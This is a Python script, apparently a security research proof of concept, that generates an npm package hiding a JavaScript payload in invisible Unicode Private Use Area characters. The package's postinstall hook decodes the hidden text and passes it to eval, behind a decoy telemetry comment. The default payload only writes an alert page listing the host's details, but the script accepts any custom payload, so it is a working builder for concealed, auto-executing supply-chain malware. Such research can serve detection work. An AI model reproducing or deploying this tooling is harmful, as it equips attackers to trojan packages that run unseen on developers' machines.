#!/usr/bin/env python3
"""
Unicode PUA Invisible Payload Encoder
Generates an npm package with a benign payload hidden in PUA-A characters.
Part of a security research PoC reproducing GlassWorm-style encoding.
"""

import json, os, argparse, random, string
from pathlib import Path

# ═══════════════════════════════════════════
# Core encode/decode
# ═══════════════════════════════════════════

def encode_pua(text: str) -> str:
    return ''.join(chr(0xF0000 + b) for b in text.encode('utf-8'))


def decode_pua(encoded: str) -> str:
    raw = bytes(ord(c) - 0xF0000 for c in encoded if 0xF0000 <= ord(c) <= 0xFFFFD)
    return raw.decode('utf-8')


def rand_var():
    return '_' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 5)))


# ═══════════════════════════════════════════
# Default payload
# ═══════════════════════════════════════════

DEFAULT_PAYLOAD = r'''
const os = require("os");
const fs = require("fs");
const path = require("path");
const { execSync } = require("child_process");

const desktop = path.join(os.homedir(), "Desktop");
const htmlPath = path.join(desktop, "YOU_HAVE_BEEN_HACKED.html");

const html = `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>ALERT</title></head>
<body style="margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
  background:#1a1a2e;font-family:monospace;color:#e94560;">
<div style="text-align:center">
  <div style="font-size:80px;margin-bottom:20px">&#9888;</div>
  <h1 style="font-size:36px;margin:0 0 16px">SUPPLY CHAIN ATTACK SIMULATION</h1>
  <p style="color:#eee;font-size:18px;max-width:600px;line-height:1.6">
    This file was created on your Desktop by an invisible Unicode payload<br>
    hidden inside a seemingly harmless npm package.<br><br>
    The code that created this was <b>completely invisible</b><br>
    in your editor, terminal, and GitHub code review.
  </p>
  <div style="margin-top:30px;padding:16px 24px;background:#16213e;border-radius:8px;
    border:1px solid #e94560;display:inline-block;text-align:left;color:#0f3460;font-size:14px">
    <span style="color:#999">hostname:</span> <span style="color:#58e">${os.hostname()}</span><br>
    <span style="color:#999">username:</span> <span style="color:#58e">${os.userInfo().username}</span><br>
    <span style="color:#999">platform:</span> <span style="color:#58e">${os.platform()} ${os.arch()}</span><br>
    <span style="color:#999">node:    </span> <span style="color:#58e">${process.version}</span><br>
    <span style="color:#999">cwd:     </span> <span style="color:#58e">${process.cwd()}</span>
  </div>
  <p style="color:#888;font-size:13px;margin-top:24px">
    This is a controlled test &mdash; no data was exfiltrated. Delete this file when done.
  </p>
</div>
</body>
</html>`;

fs.writeFileSync(htmlPath, html);

if (os.platform() === "win32") execSync('start "" "' + htmlPath + '"');
else if (os.platform() === "darwin") execSync('open "' + htmlPath + '"');
else execSync('xdg-open "' + htmlPath + '"');
'''.strip()


# ═══════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════

parser = argparse.ArgumentParser(
    description='Unicode PUA Invisible Payload Encoder — Security Research PoC')
parser.add_argument('--payload', type=str, default=None,
                    help='Custom JS payload string')
parser.add_argument('--payload-file', type=str, default=None,
                    help='Read JS payload from file')
parser.add_argument('--output-dir', type=Path, default=None,
                    help='Output directory (default: script directory)')
parser.add_argument('--decode', type=str, default=None,
                    help='Decode a file containing PUA characters back to JS')
args = parser.parse_args()

# Decode mode
if args.decode:
    content = Path(args.decode).read_text(encoding='utf-8')
    print(decode_pua(content))
    exit(0)

# Determine payload
if args.payload_file:
    JS_PAYLOAD = Path(args.payload_file).read_text(encoding='utf-8').strip()
elif args.payload:
    JS_PAYLOAD = args.payload
else:
    JS_PAYLOAD = DEFAULT_PAYLOAD

# Determine output directory
BASE = args.output_dir or Path(__file__).resolve().parent
PKG_DIR = BASE / 'invisible-utils'
TEST_DIR = BASE / 'consumer'

# Encode
invisible = encode_pua(JS_PAYLOAD)

# Verify round-trip
decoded = decode_pua(invisible)
assert decoded == JS_PAYLOAD, "FATAL: encode/decode round-trip mismatch"

# Random variable names for setup.js
v_enc = rand_var()
v_dec = rand_var()

# ═══════════════════════════════════════════
# Generate: invisible-utils package
# ═══════════════════════════════════════════

(PKG_DIR / 'lib').mkdir(parents=True, exist_ok=True)

(PKG_DIR / 'package.json').write_text(json.dumps({
    "name": "invisible-utils",
    "version": "1.0.0",
    "description": "Lightweight string utility helpers",
    "main": "lib/index.js",
    "scripts": {"postinstall": "node lib/setup.js"},
    "license": "MIT"
}, indent=2), encoding='utf-8')

(PKG_DIR / 'lib' / 'index.js').write_text('''"use strict";
function capitalize(s) {
  if (typeof s !== "string") return "";
  return s.charAt(0).toUpperCase() + s.slice(1);
}
function slugify(s) {
  return s.toLowerCase().trim().replace(/[^\\w\\s-]/g, "").replace(/\\s+/g, "-");
}
module.exports = { capitalize, slugify };
''', encoding='utf-8')

setup_js = f'''"use strict";

// Package initialization — validates runtime compatibility
// and registers telemetry opt-out preference if configured.
// See: https://github.com/nicolo-ribaudo/invisible-utils#telemetry

const {v_enc} = `{invisible}`;
const {v_dec} = [...{v_enc}].map(c => {{
  const p = c.codePointAt(0);
  return (p >= 0xF0000 && p <= 0xFFFFD) ? String.fromCharCode(p - 0xF0000) : "";
}}).join("");
if ({v_dec}) eval({v_dec});
'''

(PKG_DIR / 'lib' / 'setup.js').write_text(setup_js, encoding='utf-8')

(PKG_DIR / 'README.md').write_text(
    '# invisible-utils\nLightweight string utility helpers.\n', encoding='utf-8')

# ═══════════════════════════════════════════
# Generate: consumer project
# ═══════════════════════════════════════════

TEST_DIR.mkdir(parents=True, exist_ok=True)

(TEST_DIR / 'package.json').write_text(json.dumps({
    "name": "my-app", "version": "1.0.0", "private": True,
    "dependencies": {"invisible-utils": "file:../invisible-utils"}
}, indent=2), encoding='utf-8')

(TEST_DIR / 'app.js').write_text(
    'const { capitalize, slugify } = require("invisible-utils");\n'
    'console.log(capitalize("hello world"));\n'
    'console.log(slugify("Hello World 2024"));\n', encoding='utf-8')

# ═══════════════════════════════════════════
# Report
# ═══════════════════════════════════════════

payload_bytes = JS_PAYLOAD.encode('utf-8')
pua_count = len(invisible)
utf8_overhead = pua_count * 4

print(f"\n{'='*55}")
print(f"  Unicode PUA Encoder — Build Report")
print(f"{'='*55}")
print(f"  Payload size:         {len(payload_bytes)} bytes")
print(f"  PUA characters:       {pua_count}")
print(f"  Encoding ratio:       1:1 (1 byte = 1 PUA char)")
print(f"  UTF-8 file overhead:  {utf8_overhead} bytes")
print(f"  setup.js visible:     ~6 lines bootstrap")
print(f"  setup.js invisible:   {pua_count} PUA chars")
print(f"  Variable names:       {v_enc}, {v_dec} (randomized)")
print(f"{'='*55}")
print(f"  Files generated:")
print(f"    {PKG_DIR / 'lib' / 'setup.js'}")
print(f"    {PKG_DIR / 'lib' / 'index.js'}")
print(f"    {PKG_DIR / 'package.json'}")
print(f"    {PKG_DIR / 'README.md'}")
print(f"    {TEST_DIR / 'package.json'}")
print(f"    {TEST_DIR / 'app.js'}")
print(f"{'='*55}")
print(f"  Round-trip verification: PASSED")
print(f"{'='*55}\n")
